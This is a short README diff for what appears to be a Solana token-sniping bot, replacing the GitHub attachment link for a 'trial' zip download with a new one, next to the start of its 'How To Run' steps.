@@ -60,7 +60,7 @@ src/
 ```
 ---
 ## Trial Version
-🗂️ [solana-raypump-sniper(trial).zip](https://github.com/user-attachments/files/18752407/solana-raypump-sniper.trial.zip)
+🗂️ [solana-raypump-sniper(trial).zip](https://github.com/user-attachments/files/18754518/solana-raypump-sniper.trial.zip)
 
 ### How To Run
 1. Environment Variables Settings
